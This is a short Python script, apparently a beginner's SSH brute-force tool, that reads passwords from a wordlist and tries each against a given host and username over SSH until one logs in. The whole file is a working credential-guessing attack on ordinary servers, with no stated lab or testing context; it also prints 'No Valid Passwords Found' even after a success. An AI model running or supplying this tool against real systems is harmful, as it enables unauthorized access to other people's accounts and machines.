from pwn import ssh # Allows python to perform ssh connections
import sys          # Allows user to parse objects when executing command line scripts
import paramiko     # Allows python to except failed ssh connections

if len(sys.argv) != 3: # Checks if the number of objects parsed during execution is 3
    print("[X] Incorrect Number Of Arguments. [✓] SSH_brute_force.py >host IP< >host username<")
    sys.exit()

host = sys.argv[1]
username = sys.argv[2]
attempts = 0


with open("ssh-common-passwords.txt", "r") as password_list: # Opens the text document in read mode
    for password in password_list:
        password = password.strip("\n")                      
        try:
            print(f"Attempt: [{attempts}]. Attempting Password: '{password}'")
            response = ssh(host=host, user=username, password=password, timeout=1)  # Attempts a SSH connection to the host, username and password provided. Giving up after 1 second
            if response.connected():
                print(f"[>] Valid password found: '{password}'")
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid Password")
        except KeyboardInterrupt:
            print("Exiting")
            sys.exit()
        attempts += 1
    print("No Valid Passwords Found")
    password_list.close()
